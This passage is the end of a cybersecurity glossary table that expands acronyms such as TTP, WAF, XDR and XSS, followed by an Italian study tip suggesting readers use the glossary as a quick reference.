| TTP | Tactics, Techniques, and Procedures |
| WAF | Web Application Firewall |
| XDR | Extended Detection and Response |
| XSS | Cross-Site Scripting |

---

> 💡 **Consiglio**: Usa questo glossario come riferimento rapido durante lo studio. Quando incontri un termine che non ricordi, torna qui per un ripasso veloce. Con il tempo, questi termini diventeranno parte del tuo vocabolario quotidiano.
